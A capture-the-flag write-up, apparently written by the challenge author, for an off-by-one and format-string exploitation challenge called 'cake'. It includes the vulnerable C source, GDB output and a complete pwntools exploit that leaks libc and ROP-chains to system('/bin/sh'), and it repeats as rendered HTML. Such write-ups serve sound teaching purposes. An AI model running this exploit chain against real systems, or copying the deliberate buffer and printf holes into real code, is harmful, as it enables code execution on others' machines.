# Off-by-One Challenge
## Note
I made this challenge for [1337up Live CTF](https://ctftime.org/event/1597) 2022!

## Code Analysis

Running checksec on the executable provides the following output:

```shell
iqimpz@ubuntu:~/$ checksec ./cake
[*] 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

The stack isn't executable so we can rule out placing shellcode on the stack. PIE is enabled, so if we are wanting some ret2libc then we will need a way to leak memory addresses. There is no stack canary so we don't have to worry about that if we find a BOF.

Now what can we do with this program? The program has a menu with three options:

```
Welcome to my cake taste test!

What would you like to do?
1) Take a bite of cake!
2) Give the chef a suggestion.
3) View my suggestion.

> 
```

Although when completing the challenge you wouldn't have the source code, we can view it here to get a better understanding of how to identify the vulnerabilities during code review.

```c
#include <stdio.h>

int clean_stdin()
{
    while (getchar()!='\n');
    return 1;
}

void eat(int *bitesTaken){
	char temp[256];
	printf("Bites taken: %d\n", *bitesTaken);
	printf("How many bites would you like? (1, 2, or 3): ");
	fflush(stdout);
	read(0,temp,257);                                       // Off-by-one vuln

	if (temp[0] >= '1' && temp[0] <= '3'){
		*bitesTaken += temp[0] - 48;
		printf("Yummy!\n\n");
	}
	else {
		printf("That was not a valid amount :(\n\n");
	}

	return;
}

void make_suggestion(char* suggestion, int* suggestionMade){
	if (*suggestionMade){
		puts("You've already given our chef a suggestion. Don't overwhelm him!\n");
	}
	else {
		puts("What could our chef do better?");
		clean_stdin();
		fgets(suggestion, 126, stdin);
		*suggestionMade = 1;
		puts("Thanks for the suggestion, we will let her know!\n");
	}

	return;
}

void print_suggestion(char* suggestion, int* suggestionMade){
	if (*suggestionMade){
		printf(suggestion);                                   // Printf vuln
		printf("\n");
	}
	else {
		puts("You haven't made a suggestion.\n");
	}

	return;

}

void menu(char* suggestion, int *bitesTaken, int *suggestionMade) {
	int choice = 0;

	puts("What would you like to do?");
	puts("1) Take a bite of cake!");
	puts("2) Give the chef a suggestion.");
	puts("3) View my suggestion.\n");

	while (1) {
		printf("> ");
		scanf("%d", &choice);

		if (choice == 1){
			eat(bitesTaken);
			return;
		}
		else if (choice == 2){
			make_suggestion(suggestion, suggestionMade);
			return;
		} 
		else if (choice == 3){
			print_suggestion(suggestion, suggestionMade);
			return;
		}

		printf("That's not a valid choice. Choose again!\n");
		clean_stdin();
	}
}

int main(){
	const int MAX = 6;
	int bitesTaken = 0;
	char suggestion[126] = {};
	int suggestionMade = 0;

	setbuf(stdout, NULL);
	setbuf(stdin, NULL);

	printf("Welcome to my cake taste test!\n\n");
	while (bitesTaken < MAX){
		menu(suggestion, &bitesTaken, &suggestionMade);
	}

	printf("Ok, you have had enought cake. Bye!\n");

	return 0;
}
```

**Vuln 1:** In `eat()` (option 1), there is  call to `read(0,temp,257);`. temp is a char array of 256 bytes, so this is our off-by-one vulnerability. 

**Vuln 2:** In `print_suggestion()` (option 3), `printf(suggestion)` is called with user supplied input. So we can provide format strings that will leak addresses on the stack.

## Exploit

So our plan is to use option 2 to send a format string as the chefs' suggestion, then use option 3 to print that suggestion which will a libc address from the stack. With this, we can caculate the base address of libc and offsets to gadgets needed to pop a shell. Then we will send our payload to option 1 with our ROP chain and the 257 byte set to 0x00 to overwrite the least significant byte of the saved RBP to a NULL byte. We can see this in GDB:

```
gdb-peda$ x/40gx $rsp
0x7ffc17a2c120:	0x0000000000000000	0x00007ffc17a2c318
0x7ffc17a2c130:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c140:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c150:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c160:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c170:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c180:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c190:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c1a0:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c1b0:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c1c0:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c1d0:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c1e0:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c1f0:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c200:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c210:	0x00007f52b81f964f	0x00007f52b838be18
0x7ffc17a2c220:	0x00007f52b82274b0	0x4141414141414141
0x7ffc17a2c230:	0x00007ffc17a2c200	0x000055fbb0ff0b3d
0x7ffc17a2c240:	0x000055fbb0ff0eb0	0x00007ffc17a2c28c
```

The value at 0x7ffc17a2c220 is the saved RBP and as you can see it now has the value 0x00007ffc17a2c200 after the overwrite which points into the attacker controlled buffer. Specifically it falls right into our ret sled that eventually calls system to give us a shell.

Below is the exploit: 

```python
#!/usr/bin/python
from pwn import *

e = ELF("./cake")
p = e.process()
#p = remote("172.23.32.1", 9999)        #                 <-- Use this for remote

libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

libc_leak_offset = 0x21BF7                             # The offset of <__libc_start_main+231>. Used to calculate libc base address
pop_rdi_offset = 0x00000000000215bf                    # pop rdi; gadget offset in libc
ret_offset = 0x00000000000008aa                        # ret; gadget offset in libc

def printf_leak():
    # Use the printf vuln to leak <__libc_start_main+231>
    p.recv()
    p.sendline("2")
    p.recvuntil("What could our chef do better?\n")
    p.sendline("%39$p")

    p.recv()
    p.sendline("3")
    leak = p.recvline()
    leak = int(leak[2:].strip(), 16)                    # convert the address to integer
    return leak

def returns():
    str = ''
    for i in range(0,28):
        str += p64(libc.address+ret_offset)
    return str

def bof(payload):
    p.recv()
    p.sendline("1")
    p.recv()
    p.sendline(payload)


# Leak libc address to calculate libc base address
libc_leak = printf_leak()
log.info("Libc Leak: %s", hex(libc_leak))
libc.address = libc_leak - libc_leak_offset
log.info("Libc Base Address: %s", hex(libc.address))

# Ropchain for system("/bin/sh")
payload = returns()
payload += p64(libc.address+pop_rdi_offset)
payload += p64(next(libc.search('/bin/sh\x00')))
payload += p64(libc.symbols['system'])
payload += 'AAAAAAAA\x00'                                # Use off-by-one vuln to overwrite least significant byte of the saved RBP with 0x00, shifting code executin to our buffer.
bof(payload)
p.interactive()

```










# HTML
```
<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant="" defer=""></script>
  
    <title>Off by One Challenge :: Capstone Project</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Off-by-One Challenge Note I made this challenge for 1337up Live CTF 2022!
Code Analysis Running checksec on the executable provides the following output:
iqimpz@ubuntu:~/$ checksec ./cake [*]  Arch: amd64-64-little  RELRO: Full RELRO  Stack: No canary found  NX: NX enabled  PIE: PIE enabled The stack isn&amp;rsquo;t executable so we can rule out placing shellcode on the stack. PIE is enabled, so if we are wanting some ret2libc then we will need a way to leak memory addresses.">
<meta name="keywords" content="">
<meta name="robots" content="noodp">
<link rel="canonical" href="http://localhost:1313/posts/off-by-one-challenge/">




<link rel="stylesheet" href="http://localhost:1313/assets/style.css">

  <link rel="stylesheet" href="http://localhost:1313/assets/pink.css">






<link rel="apple-touch-icon" href="http://localhost:1313/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="http://localhost:1313/img/favicon/pink.png">



<meta name="twitter:card" content="summary">



<meta property="og:locale" content="en">
<meta property="og:type" content="article">
<meta property="og:title" content="Off by One Challenge">
<meta property="og:description" content="Off-by-One Challenge Note I made this challenge for 1337up Live CTF 2022!
Code Analysis Running checksec on the executable provides the following output:
iqimpz@ubuntu:~/$ checksec ./cake [*]  Arch: amd64-64-little  RELRO: Full RELRO  Stack: No canary found  NX: NX enabled  PIE: PIE enabled The stack isn&amp;rsquo;t executable so we can rule out placing shellcode on the stack. PIE is enabled, so if we are wanting some ret2libc then we will need a way to leak memory addresses.">
<meta property="og:url" content="http://localhost:1313/posts/off-by-one-challenge/">
<meta property="og:site_name" content="Capstone Project">

  <meta property="og:image" content="http://localhost:1313/">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-04-05 10:26:38 -0700 PDT">












</head>
<body class="pink">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Capstone Project
  </div>
</a>

    </div>
    
      <div class="menu-trigger hidden">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/showcase">Showcase</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/showcase">Showcase</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="http://localhost:1313/posts/off-by-one-challenge/">Off by One Challenge</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-04-05
        
      </span>
    
    
    
  </div>

  
  


  

  <div class="post-content"><div>
        <h1 id="off-by-one-challenge">Off-by-One Challenge<a href="#off-by-one-challenge" class="hanchor" arialabel="Anchor">⌗</a> </h1>
<h2 id="note">Note<a href="#note" class="hanchor" arialabel="Anchor">⌗</a> </h2>
<p>I made this challenge for <a href="https://ctftime.org/event/1597">1337up Live CTF</a> 2022!</p>
<h2 id="code-analysis">Code Analysis<a href="#code-analysis" class="hanchor" arialabel="Anchor">⌗</a> </h2>
<p>Running checksec on the executable provides the following output:</p>
<div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" class=" language-shell"><code class=" language-shell" data-lang="shell">iqimpz@ubuntu:~/$ checksec ./cake
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div></div><p>The stack isn’t executable so we can rule out placing shellcode on the stack. PIE is enabled, so if we are wanting some ret2libc then we will need a way to leak memory addresses. There is no stack canary so we don’t have to worry about that if we find a BOF.</p>
<p>Now what can we do with this program? The program has a menu with three options:</p>
<pre tabindex="0"><code>Welcome to my cake taste test!

What would you like to do?
1) Take a bite of cake!
2) Give the chef a suggestion.
3) View my suggestion.

&gt; 
</code></pre><p>Although when completing the challenge you wouldn’t have the source code, we can view it here to get a better understanding of how to identify the vulnerabilities during code review.</p>
<div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" class=" language-c"><code class=" language-c" data-lang="c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword keyword-int">int</span> <span class="token function">clean_stdin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword keyword-while">while</span> <span class="token punctuation">(</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword keyword-return">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword keyword-void">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token keyword keyword-int">int</span> <span class="token operator">*</span>bitesTaken<span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword keyword-char">char</span> temp<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Bites taken: %d\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>bitesTaken<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"How many bites would you like? (1, 2, or 3): "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>temp<span class="token punctuation">,</span><span class="token number">257</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                       <span class="token comment">// Off-by-one vuln</span>

	<span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&gt;=</span> <span class="token string">'1'</span> <span class="token operator">&amp;&amp;</span> temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token operator">*</span>bitesTaken <span class="token operator">+=</span> temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Yummy!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword keyword-else">else</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"That was not a valid amount :(\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword keyword-return">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword keyword-void">void</span> <span class="token function">make_suggestion</span><span class="token punctuation">(</span><span class="token keyword keyword-char">char</span><span class="token operator">*</span> suggestion<span class="token punctuation">,</span> <span class="token keyword keyword-int">int</span><span class="token operator">*</span> suggestionMade<span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>suggestionMade<span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You've already given our chef a suggestion. Don't overwhelm him!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword keyword-else">else</span> <span class="token punctuation">{</span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What could our chef do better?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">clean_stdin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">fgets</span><span class="token punctuation">(</span>suggestion<span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token operator">*</span>suggestionMade <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Thanks for the suggestion, we will let her know!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword keyword-return">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword keyword-void">void</span> <span class="token function">print_suggestion</span><span class="token punctuation">(</span><span class="token keyword keyword-char">char</span><span class="token operator">*</span> suggestion<span class="token punctuation">,</span> <span class="token keyword keyword-int">int</span><span class="token operator">*</span> suggestionMade<span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>suggestionMade<span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span>suggestion<span class="token punctuation">)</span><span class="token punctuation">;</span>                                   <span class="token comment">// Printf vuln</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword keyword-else">else</span> <span class="token punctuation">{</span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You haven't made a suggestion.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword keyword-return">return</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token keyword keyword-void">void</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token keyword keyword-char">char</span><span class="token operator">*</span> suggestion<span class="token punctuation">,</span> <span class="token keyword keyword-int">int</span> <span class="token operator">*</span>bitesTaken<span class="token punctuation">,</span> <span class="token keyword keyword-int">int</span> <span class="token operator">*</span>suggestionMade<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword keyword-int">int</span> choice <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What would you like to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1) Take a bite of cake!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"2) Give the chef a suggestion."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"3) View my suggestion.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword keyword-while">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&gt; "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>choice <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token function">eat</span><span class="token punctuation">(</span>bitesTaken<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword keyword-return">return</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword keyword-else">else</span> <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>choice <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token function">make_suggestion</span><span class="token punctuation">(</span>suggestion<span class="token punctuation">,</span> suggestionMade<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword keyword-return">return</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span> 
		<span class="token keyword keyword-else">else</span> <span class="token keyword keyword-if">if</span> <span class="token punctuation">(</span>choice <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token function">print_suggestion</span><span class="token punctuation">(</span>suggestion<span class="token punctuation">,</span> suggestionMade<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword keyword-return">return</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"That's not a valid choice. Choose again!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">clean_stdin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword keyword-int">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword keyword-const">const</span> <span class="token keyword keyword-int">int</span> MAX <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
	<span class="token keyword keyword-int">int</span> bitesTaken <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword keyword-char">char</span> suggestion<span class="token punctuation">[</span><span class="token number">126</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
	<span class="token keyword keyword-int">int</span> suggestionMade <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to my cake taste test!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword keyword-while">while</span> <span class="token punctuation">(</span>bitesTaken <span class="token operator">&lt;</span> MAX<span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token function">menu</span><span class="token punctuation">(</span>suggestion<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bitesTaken<span class="token punctuation">,</span> <span class="token operator">&amp;</span>suggestionMade<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Ok, you have had enought cake. Bye!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword keyword-return">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div></div><p><strong>Vuln 1:</strong> In <code>eat()</code> (option 1), there is  call to <code>read(0,temp,257);</code>. temp is a char array of 256 bytes, so this is our off-by-one vulnerability.</p>
<p><strong>Vuln 2:</strong> In <code>print_suggestion()</code> (option 3), <code>printf(suggestion)</code> is called with user supplied input. So we can provide format strings that will leak addresses on the stack.</p>
<h2 id="exploit">Exploit<a href="#exploit" class="hanchor" arialabel="Anchor">⌗</a> </h2>
<p>So our plan is to use option 2 to send a format string as the chefs’ suggestion, then use option 3 to print that suggestion which will a libc address from the stack. With this, we can caculate the base address of libc and offsets to gadgets needed to pop a shell. Then we will send our payload to option 1 with our ROP chain and the 257 byte set to 0x00 to overwrite the least significant byte of the saved RBP to a NULL byte. We can see this in GDB:</p>
<pre tabindex="0"><code>gdb-peda$ x/40gx $rsp
0x7ffc17a2c120:	0x0000000000000000	0x00007ffc17a2c318
0x7ffc17a2c130:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c140:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c150:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c160:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c170:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c180:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c190:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c1a0:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c1b0:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c1c0:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c1d0:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c1e0:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c1f0:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c200:	0x00007f52b81d893a	0x00007f52b81d893a
0x7ffc17a2c210:	0x00007f52b81f964f	0x00007f52b838be18
0x7ffc17a2c220:	0x00007f52b82274b0	0x4141414141414141
0x7ffc17a2c230:	0x00007ffc17a2c200	0x000055fbb0ff0b3d
0x7ffc17a2c240:	0x000055fbb0ff0eb0	0x00007ffc17a2c28c
</code></pre><p>The value at 0x7ffc17a2c220 is the saved RBP and as you can see it now has the value 0x00007ffc17a2c200 after the overwrite which points into the attacker controlled buffer. Specifically it falls right into our ret sled that eventually calls system to give us a shell.</p>
<p>Below is the exploit:</p>
<div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" class=" language-python"><code class=" language-python" data-lang="python"><span class="token comment">#!/usr/bin/python</span>
<span class="token keyword keyword-from">from</span> pwn <span class="token keyword keyword-import">import</span> <span class="token operator">*</span>

e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./cake"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> e<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#p = remote("172.23.32.1", 9999)        #                 &lt;-- Use this for remote</span>

libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span><span class="token punctuation">)</span>

libc_leak_offset <span class="token operator">=</span> <span class="token number">0x21BF7</span>                             <span class="token comment"># The offset of &lt;__libc_start_main+231&gt;. Used to calculate libc base address</span>
pop_rdi_offset <span class="token operator">=</span> <span class="token number">0x00000000000215bf</span>                    <span class="token comment"># pop rdi; gadget offset in libc</span>
ret_offset <span class="token operator">=</span> <span class="token number">0x00000000000008aa</span>                        <span class="token comment"># ret; gadget offset in libc</span>

<span class="token keyword keyword-def">def</span> <span class="token function">printf_leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Use the printf vuln to leak &lt;__libc_start_main+231&gt;</span>
    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What could our chef do better?\n"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"%39$p"</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
    leak <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
    leak <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>leak<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                    <span class="token comment"># convert the address to integer</span>
    <span class="token keyword keyword-return">return</span> leak

<span class="token keyword keyword-def">def</span> <span class="token function">returns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword keyword-for">for</span> i <span class="token keyword keyword-in">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">str</span> <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span>ret_offset<span class="token punctuation">)</span>
    <span class="token keyword keyword-return">return</span> <span class="token builtin">str</span>

<span class="token keyword keyword-def">def</span> <span class="token function">bof</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>


<span class="token comment"># Leak libc address to calculate libc base address</span>
libc_leak <span class="token operator">=</span> printf_leak<span class="token punctuation">(</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Libc Leak: %s"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_leak<span class="token punctuation">)</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_leak <span class="token operator">-</span> libc_leak_offset
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Libc Base Address: %s"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># Ropchain for system("/bin/sh")</span>
payload <span class="token operator">=</span> returns<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span>pop_rdi_offset<span class="token punctuation">)</span>
